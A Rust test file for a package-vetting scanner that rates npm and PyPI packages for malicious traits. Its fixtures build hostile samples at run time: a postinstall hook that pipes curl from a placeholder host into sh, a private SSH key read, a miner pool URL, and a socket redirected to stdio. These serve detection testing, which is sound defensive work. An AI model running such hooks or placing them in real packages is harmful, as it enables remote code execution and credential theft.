#![allow(
    clippy::case_sensitive_file_extension_comparisons,
    clippy::cast_possible_truncation,
    clippy::too_many_lines,
    clippy::items_after_statements
)]

//! Package vetting (WP6), second round: cache identity for manifest paths,
//! false positives on mainstream package layouts, manifest decoys, bounded
//! dependency lists, and small argument checks.

use std::io::Write as _;
use std::path::{Path, PathBuf};

use file_scanner::{
    mcp_server::FileScannerMcp,
    npm_analysis::{analyze_npm_package, RiskLevel as NpmRisk},
    npm_vuln_db::{check_typosquatting_similarity as npm_typo, get_known_malicious_packages},
    python_analysis::{analyze_python_package, RiskLevel as PyRisk},
    python_vuln_db::{
        check_package_vulnerabilities as py_check, check_typosquatting_similarity as py_typo,
        get_known_malicious_packages as py_malicious,
    },
};
use rmcp::{model::CallToolRequestParams, ServiceExt};
use serde_json::{json, Value};
use tempfile::TempDir;

fn tgz(entries: &[(&str, &[u8])]) -> Vec<u8> {
    let mut builder = tar::Builder::new(Vec::new());
    for (path, data) in entries {
        let mut header = tar::Header::new_gnu();
        header.set_size(data.len() as u64);
        header.set_mode(0o644);
        header.set_entry_type(tar::EntryType::Regular);
        header.set_cksum();
        builder.append_data(&mut header, path, *data).unwrap();
    }
    let tar_bytes = builder.into_inner().unwrap();
    let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
    encoder.write_all(&tar_bytes).unwrap();
    encoder.finish().unwrap()
}

fn zip_of(entries: &[(&str, &[u8])]) -> Vec<u8> {
    let mut writer = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
    let options = zip::write::SimpleFileOptions::default();
    for (path, data) in entries {
        writer.start_file(*path, options).unwrap();
        writer.write_all(data).unwrap();
    }
    writer.finish().unwrap().into_inner()
}

fn write(dir: &Path, name: &str, bytes: &[u8]) -> PathBuf {
    let path = dir.join(name);
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).unwrap();
    }
    std::fs::write(&path, bytes).unwrap();
    path
}

/// A source file with a miner URL and a private-key read, built at run time.
fn evil_js() -> String {
    let pool = ["stratum", "+tcp://pool.example.invalid:3333"].concat();
    format!(
        "const pool = '{pool}';\nrequire('fs').readFileSync(process.env.HOME + '/.ssh/id_rsa');\n"
    )
}

const PKG: &str = r#"{"name":"demo-pkg","version":"1.0.0"}"#;

async fn client() -> rmcp::service::RunningService<rmcp::RoleClient, ()> {
    let (server_io, client_io) = tokio::io::duplex(1 << 20);
    tokio::spawn(async move {
        if let Ok(service) = FileScannerMcp::new().serve(server_io).await {
            let _ = service.waiting().await;
        }
    });
    ().serve(client_io).await.expect("handshake")
}

async fn call(
    client: &rmcp::service::RunningService<rmcp::RoleClient, ()>,
    tool: &str,
    args: Value,
) -> (bool, String) {
    let Value::Object(map) = args else {
        panic!("object")
    };
    let result = client
        .call_tool(CallToolRequestParams::new(tool.to_string()).with_arguments(map))
        .await
        .expect("protocol");
    let text = result
        .content
        .first()
        .and_then(|b| b.as_text())
        .map(|t| t.text.clone())
        .unwrap_or_default();
    (result.is_error == Some(true), text)
}

async fn summary(
    client: &rmcp::service::RunningService<rmcp::RoleClient, ()>,
    tool: &str,
    path: &Path,
) -> Value {
    let (is_error, text) = call(client, tool, json!({"package_path": path})).await;
    assert!(!is_error, "{text}");
    serde_json::from_str(&text).unwrap()
}

// ---------------------------------------------------------------------------
// Cache identity when a manifest file path is passed
// ---------------------------------------------------------------------------

#[tokio::test]
async fn a_manifest_path_is_cached_by_its_whole_directory() {
    let dir = TempDir::new().unwrap();
    let a = write(dir.path(), "a/package.json", PKG.as_bytes());
    write(dir.path(), "a/index.js", b"module.exports = 1;\n");
    let b = write(dir.path(), "b/package.json", PKG.as_bytes());
    write(dir.path(), "b/index.js", evil_js().as_bytes());

    let client = client().await;
    let first = summary(&client, "analyze_npm_package", &a).await;
    assert_eq!(first["cache"], "miss");
    assert_eq!(first["risk"]["level"], "Safe");
    // Same manifest bytes, different directory: not a cache hit, and not Safe.
    let second = summary(&client, "analyze_npm_package", &b).await;
    assert_eq!(second["cache"], "miss", "{second}");
    assert_ne!(second["risk"]["level"], "Safe", "{second}");
    assert!(second["findings"]["total"].as_u64().unwrap() >= 1);

    // A change to a sibling source file invalidates the entry.
    write(dir.path(), "a/index.js", evil_js().as_bytes());
    let third = summary(&client, "analyze_npm_package", &a).await;
    assert_eq!(third["cache"], "miss", "{third}");
    assert_ne!(third["risk"]["level"], "Safe");
    client.cancel().await.unwrap();
}

#[tokio::test]
async fn a_python_manifest_path_is_cached_by_its_whole_directory() {
    let dir = TempDir::new().unwrap();
    let setup = "from setuptools import setup\nsetup(name='demo', version='1.0')\n";
    let a = write(dir.path(), "a/setup.py", setup.as_bytes());
    write(dir.path(), "a/demo.py", b"x = 1\n");
    let b = write(dir.path(), "b/setup.py", setup.as_bytes());
    write(dir.path(), "b/demo.py", evil_js().as_bytes());

    let client = client().await;
    let first = summary(&client, "analyze_python_package", &a).await;
    assert_eq!(first["cache"], "miss");
    let second = summary(&client, "analyze_python_package", &b).await;
    assert_eq!(second["cache"], "miss", "{second}");
    assert!(
        second["findings"]["total"].as_u64().unwrap() >= 1,
        "{second}"
    );
    client.cancel().await.unwrap();
}

// ---------------------------------------------------------------------------
// Mainstream layouts are not rated High or Critical
// ---------------------------------------------------------------------------

#[test]
fn comment_links_type_declarations_and_node_env_are_quiet_in_npm() {
    let dir = TempDir::new().unwrap();
    write(dir.path(), "package.json", PKG.as_bytes());
    write(
        dir.path(),
        "visit.js",
        b"// see https://gist.github.com/someone/abc123 for the idea\n// https://raw.githubusercontent.com/x/y/main/z.js\nmodule.exports = 1;\n",
    );
    write(
        dir.path(),
        "index.d.ts",
        b"/** Reads process.env and posts it to https://example.com with fetch( */\nexport declare const a: string;\n",
    );
    write(
        dir.path(),
        "dayjs.min.js",
        b"var d=process.env.NODE_ENV!=='production'&&console.warn('see https://day.js.org/docs');module.exports=d\n",
    );
    write(
        dir.path(),
        "lexers.js",
        b"module.exports = { filenames: ['*.bashrc', '.zshrc', '.git-credentials'] };\n",
    );
    let analysis = analyze_npm_package(dir.path()).unwrap();
    assert!(
        analysis.malicious_indicators.overall_risk_score < 20.0,
        "{:?} {:?}",
        analysis.malicious_indicators.risk_reasons,
        analysis.source_findings
    );
    assert!(matches!(
        analysis.malicious_indicators.risk_level,
        NpmRisk::Safe
    ));
    assert!(!analysis.security_analysis.data_exfiltration_risk);
}

#[test]
fn a_click_like_dup2_and_a_gist_comment_are_quiet_in_python() {
    let dir = TempDir::new().unwrap();
    write(
        dir.path(),
        "setup.py",
        b"from setuptools import setup\nsetup(name='click-like', version='8.4.0')\n",
    );
    write(
        dir.path(),
        "click/testing.py",
        b"import os\nclass R:\n    def go(self):\n        os.dup2(self._tmpfile.fileno(), self._targetfd)\n",
    );
    write(
        dir.path(),
        "click/termui.py",
        b"# https://gist.github.com/someone/abc123\nx = 1\n",
    );
    let analysis = analyze_python_package(dir.path()).unwrap();
    assert!(
        analysis.malicious_indicators.overall_risk_score < 40.0,
        "{:?} {:?}",
        analysis.malicious_indicators.risk_reasons,
        analysis.source_findings
    );
    assert!(analysis
        .source_findings
        .iter()
        .all(|f| f.rule != "Socket redirected to stdio"));
    assert!(!analysis.security_analysis.data_exfiltration_risk);
}

#[test]
fn a_real_socket_dup2_is_still_critical() {
    let dir = TempDir::new().unwrap();
    write(
        dir.path(),
        "setup.py",
        b"from setuptools import setup\nsetup(name='demo', version='1.0')\n",
    );
    write(
        dir.path(),
        "demo.py",
        b"import os, socket\ns = socket.socket()\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\n",
    );
    let analysis = analyze_python_package(dir.path()).unwrap();
    assert!(analysis
        .source_findings
        .iter()
        .any(|f| f.rule == "Socket redirected to stdio" && f.severity == "Critical"));
    assert!(matches!(
        analysis.malicious_indicators.risk_level,
        PyRisk::High | PyRisk::Critical
    ));
}

#[test]
fn test_scripts_are_not_matched_against_name_patterns() {
    let dir = TempDir::new().unwrap();
    write(
        dir.path(),
        "package.json",
        br#"{"name":"uuid-like","version":"9.0.0","scripts":{"test":"node --test test/*.js","lint":"pnpm -w exec nx test"}}"#,
    );
    let analysis = analyze_npm_package(dir.path()).unwrap();
    assert!(
        analysis
            .malicious_indicators
            .known_malicious_patterns
            .is_empty(),
        "{:?}",
        analysis.malicious_indicators.known_malicious_patterns
    );
    assert!(matches!(
        analysis.malicious_indicators.risk_level,
        NpmRisk::Safe
    ));
}

#[test]
fn known_compromised_releases_are_critical_on_their_own() {
    let dir = TempDir::new().unwrap();
    for (name, version) in [("coa", "2.0.3"), ("rc", "1.2.9"), ("eslint-scope", "3.7.2")] {
        let manifest = format!(r#"{{"name":"{name}","version":"{version}"}}"#);
        let path = write(
            dir.path(),
            &format!("{name}/package.json"),
            manifest.as_bytes(),
        );
        let analysis = analyze_npm_package(path.parent().unwrap()).unwrap();
        assert!(
            matches!(analysis.malicious_indicators.risk_level, NpmRisk::Critical),
            "{name}@{version}: {:?}",
            analysis.malicious_indicators.risk_level
        );
    }
    // The same release as a dependency is flagged when pinned.
    let consumer = write(
        dir.path(),
        "consumer/package.json",
        br#"{"name":"consumer","version":"1.0.0","dependencies":{"coa":"2.0.3"}}"#,
    );
    let analysis = analyze_npm_package(consumer.parent().unwrap()).unwrap();
    assert_eq!(
        analysis.dependencies.vulnerability_summary.critical_count,
        1
    );
    // And in a PyPI requirements file.
    let reqs = write(dir.path(), "requirements.txt", b"ctx==0.1.2\nrequests>=2\n");
    let analysis = analyze_python_package(&reqs).unwrap();
    assert_eq!(
        analysis.dependencies.vulnerability_summary.critical_count,
        1
    );
}

// ---------------------------------------------------------------------------
// Decoy manifests
// ---------------------------------------------------------------------------

fn evil_manifest() -> String {
    let hook = ["cu", "rl http://example.invalid/x.sh | sh"].concat();
    format!(
        r#"{{"name":"decoy-demo","version":"2.0.0","scripts":{{"postinstall":"{hook}"}},"dependencies":{{"event-stream":"3.3.6"}}}}"#
    )
}

#[test]
fn a_root_level_decoy_manifest_does_not_hide_the_real_one() {
    let dir = TempDir::new().unwrap();
    let evil = evil_manifest();
    let archive = tgz(&[
        (
            "package.json",
            br#"{"name":"decoy-demo","version":"2.0.0"}"#,
        ),
        ("package/package.json", evil.as_bytes()),
        ("package/index.js", b"module.exports = 1;\n"),
    ]);
    let path = write(dir.path(), "decoy.tgz", &archive);
    let analysis = analyze_npm_package(&path).unwrap();
    assert_eq!(
        analysis.input.manifest.as_deref(),
        Some("package/package.json")
    );
    assert!(analysis.security_analysis.has_postinstall_script);
    assert!(matches!(
        analysis.malicious_indicators.risk_level,
        NpmRisk::High | NpmRisk::Critical
    ));
    assert!(analysis
        .source_findings
        .iter()
        .any(|f| f.rule == "Several package.json files"));
}

#[test]
fn the_last_top_level_manifest_wins_as_npm_extracts_it() {
    let dir = TempDir::new().unwrap();
    let evil = evil_manifest();
    let archive = tgz(&[
        (
            "package/package.json",
            br#"{"name":"decoy-demo","version":"2.0.0"}"#,
        ),
        ("zzz/package.json", evil.as_bytes()),
    ]);
    let path = write(dir.path(), "othertop.tgz", &archive);
    let analysis = analyze_npm_package(&path).unwrap();
    assert_eq!(analysis.input.manifest.as_deref(), Some("zzz/package.json"));
    assert!(analysis.security_analysis.has_postinstall_script);
    assert!(analysis
        .input
        .notes
        .iter()
        .any(|n| n.contains("more than one")));
}

#[test]
fn a_directory_with_a_nested_package_json_is_not_flagged() {
    let dir = TempDir::new().unwrap();
    write(dir.path(), "package.json", PKG.as_bytes());
    write(dir.path(), "esm/package.json", br#"{"type":"module"}"#);
    let analysis = analyze_npm_package(dir.path()).unwrap();
    assert!(analysis.source_findings.is_empty());
}

#[test]
fn a_wheel_with_two_dist_info_directories_is_flagged() {
    let dir = TempDir::new().unwrap();
    let archive = zip_of(&[
        (
            "aaa-1.0.dist-info/METADATA",
            b"Metadata-Version: 2.1\nName: aaa\nVersion: 1.0\n",
        ),
        (
            "real-2.0.dist-info/METADATA",
            b"Metadata-Version: 2.1\nName: real\nVersion: 2.0\nRequires-Dist: requests (==2.5.0)\n",
        ),
    ]);
    let path = write(dir.path(), "real-2.0-py3-none-any.whl", &archive);
    let analysis = analyze_python_package(&path).unwrap();
    assert!(analysis
        .source_findings
        .iter()
        .any(|f| f.rule == "Several .dist-info directories"));
}

// ---------------------------------------------------------------------------
// Bounded dependency lists
// ---------------------------------------------------------------------------

#[test]
fn an_oversized_dependency_list_is_refused_with_the_limit() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("requirements-big.txt");
    let file = std::fs::File::create(&path).unwrap();
    file.set_len(17 * 1024 * 1024).unwrap();
    let error = analyze_python_package(&path).unwrap_err().to_string();
    assert!(
        error.contains("16 MiB") && error.contains("17 MiB"),
        "{error}"
    );

    let lock = dir.path().join("package-lock.json");
    let file = std::fs::File::create(&lock).unwrap();
    file.set_len(17 * 1024 * 1024).unwrap();
    let error = analyze_npm_package(&lock).unwrap_err().to_string();
    assert!(error.contains("16 MiB"), "{error}");
}

#[test]
fn a_huge_requirements_list_is_capped_with_a_note() {
    let dir = TempDir::new().unwrap();
    let mut text = String::new();
    for i in 0..25_000 {
        text.push_str(&format!("pkg{i}==1.0.0\n"));
    }
    let path = write(dir.path(), "requirements.txt", text.as_bytes());
    let analysis = analyze_python_package(&path).unwrap();
    assert_eq!(analysis.dependencies.install_requires.len(), 20_000);
    assert!(analysis
        .input
        .notes
        .iter()
        .any(|n| n.contains("first 20000")));
}

#[test]
fn a_huge_lock_file_is_capped() {
    let dir = TempDir::new().unwrap();
    let mut packages = serde_json::Map::new();
    packages.insert(String::new(), json!({"name": "big", "version": "1.0.0"}));
    for i in 0..25_000 {
        packages.insert(format!("node_modules/p{i}"), json!({"version": "1.0.0"}));
    }
    let lock =
        json!({"name": "big", "version": "1.0.0", "lockfileVersion": 3, "packages": packages});
    let path = write(dir.path(), "package-lock.json", lock.to_string().as_bytes());
    let analysis = analyze_npm_package(&path).unwrap();
    assert!(analysis.dependencies.dependencies.len() <= 20_000);
    assert!(analysis.dependencies.locked_packages.len() <= 20_000);
}

// ---------------------------------------------------------------------------
// Small defects
// ---------------------------------------------------------------------------

#[test]
fn a_version_at_the_integer_limit_does_not_panic() {
    let dir = TempDir::new().unwrap();
    write(
        dir.path(),
        "package.json",
        br#"{"name":"overflow-demo","version":"1.0.0","dependencies":{"a":">1.0.18446744073709551615"}}"#,
    );
    let analysis = analyze_npm_package(dir.path()).unwrap();
    assert_eq!(analysis.package_info.name, "overflow-demo");
}

#[test]
fn a_huge_package_name_is_not_compared() {
    let name = "a".repeat(300_000);
    let started = std::time::Instant::now();
    assert!(npm_typo(&name).is_none());
    assert!(py_typo(&name).is_none());
    assert!(started.elapsed().as_secs() < 2);
}

#[test]
fn official_companion_packages_are_not_typosquats() {
    for name in [
        "eslint-utils",
        "jest-cli",
        "gulp-cli",
        "grunt-cli",
        "puppeteer-core",
        "playwright-core",
        "bcryptjs",
        "fast-glob",
        "pathe",
    ] {
        assert!(npm_typo(name).is_none(), "{name}: {:?}", npm_typo(name));
    }
    for name in ["attr", "boto"] {
        assert!(py_typo(name).is_none(), "{name}: {:?}", py_typo(name));
    }
    // Real typosquats still are.
    assert!(npm_typo("expresss").is_some());
    assert!(npm_typo("lodahs").is_some());
    assert!(py_typo("reqeusts").is_some());
}

#[test]
fn legitimate_names_are_off_the_known_malicious_lists() {
    let npm = get_known_malicious_packages();
    assert!(!npm.contains(&"yarnpkg"));
    let pypi = py_malicious();
    for name in [
        "acquisition",
        "sklearn",
        "beautifulsoup",
        "pytorch",
        "crypto",
    ] {
        assert!(!pypi.contains(&name), "{name}");
    }
}

#[test]
fn the_requests_advisory_starts_at_2_3_0() {
    assert!(py_check("requests", "1.0.0").is_empty());
    assert!(py_check("requests", "2.2.1").is_empty());
    assert_eq!(py_check("requests", "2.9.1").len(), 1);
    assert!(py_check("requests", "2.31.0").is_empty());
}

#[tokio::test]
async fn arguments_are_checked_with_text_a_model_can_act_on() {
    let dir = TempDir::new().unwrap();
    write(dir.path(), "package.json", PKG.as_bytes());
    write(dir.path(), "index.js", evil_js().as_bytes());
    for i in 0..3 {
        write(
            dir.path(),
            &format!("lib/m{i}.js"),
            b"module.exports = 1;\n",
        );
    }
    let client = client().await;

    let (is_error, text) = call(
        &client,
        "analyze_npm_package",
        json!({"package_path": dir.path(), "section": "findings", "min_severity": "bogus"}),
    )
    .await;
    assert!(is_error);
    assert!(text.contains("critical, high, medium, low"), "{text}");

    let (is_error, text) = call(&client, "analyze_npm_package", json!({"package_path": ""})).await;
    assert!(is_error);
    assert!(!text.contains("Path path"), "{text}");

    // File rows say whether the content was scanned.
    let (is_error, text) = call(
        &client,
        "analyze_npm_package",
        json!({"package_path": dir.path(), "section": "files"}),
    )
    .await;
    assert!(!is_error, "{text}");
    let files: Value = serde_json::from_str(&text).unwrap();
    let rows = files["items"].as_array().expect("rows");
    let manifest = rows
        .iter()
        .find(|r| r["path"] == "package.json")
        .expect("package.json row");
    assert_eq!(manifest["source_scanned"], false);
    assert!(manifest["entropy"].is_null());
    let index = rows.iter().find(|r| r["path"] == "index.js").unwrap();
    assert_eq!(index["source_scanned"], true);
    assert!(index["entropy"].is_number());
    client.cancel().await.unwrap();
}
